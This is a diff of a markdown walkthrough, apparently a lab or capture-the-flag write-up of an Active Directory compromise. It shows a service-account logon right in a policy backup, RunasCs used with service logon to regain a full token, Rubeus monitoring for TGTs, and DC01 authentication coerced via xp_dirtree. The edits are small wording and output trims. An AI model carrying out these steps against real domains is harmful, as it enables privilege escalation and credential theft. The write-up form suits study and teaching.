@@ -406,7 +406,6 @@ Impacket v0.12.0 - Copyright Fortra, LLC and its affiliated companies
 
 The `Policy_Backup.inf` found on DC02 shows `svc_sql` has `SeServiceLogonRight`. 
 ```powershell
-PS C:\Windows\system32> cd c:\
 PS C:\> ls
 
 
@@ -431,6 +430,7 @@ Unicode=yes
 [Privilege Rights]
 ...
 SeServiceLogonRight = *S-1-5-20,svc_sql,SQLServer2005SQLBrowserUser$DC02,*S-1-5-80-0,*S-1-5-80-2652535364-2169709536-2857650723-2622804123-1107741775,*S-1-5-80-344959196-2060754871-2302487193-2804545603-1466107430,*S-1-5-80-3880718306-3832830129-1677859214-2598158968-1052248003
+...
 
 ```
 Using `RunasCs` with `--logon-type 5` (service logon) restores the full token:
@@ -524,7 +524,7 @@ From the Administrator shell on DC02, launching Rubeus in TGT monitoring mode:
 ./Rubeus.exe monitor /interval:5 /nowrap
 ```
 
-### Step 2 — Coerce DC01 Authentication with SpoolSample
+### Step 2 — Coerce DC01 Authentication 
 
 From a separate MSSQL session on DC01, triggering authentication to DC02 via `xp_dirtree`:
 
